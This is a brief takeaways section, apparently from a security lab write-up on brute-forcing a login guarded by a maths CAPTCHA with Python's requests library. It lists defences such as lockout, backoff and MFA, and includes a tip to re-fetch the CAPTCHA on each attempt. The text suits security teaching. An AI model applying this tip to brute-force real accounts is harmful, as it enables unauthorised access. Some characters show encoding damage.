## ЁЯУЭ Key Takeaways

- CAPTCHAs are only effective if they can't be solved programmatically тАФ simple maths CAPTCHAs offer no protection against scripted attacks.
- Python's `requests` library is a powerful tool for automating web interactions.
- Real-world brute force defences: account lockout, exponential backoff, proper image CAPTCHAs, MFA.
- Always re-fetch the CAPTCHA each attempt тАФ they typically expire after one use.

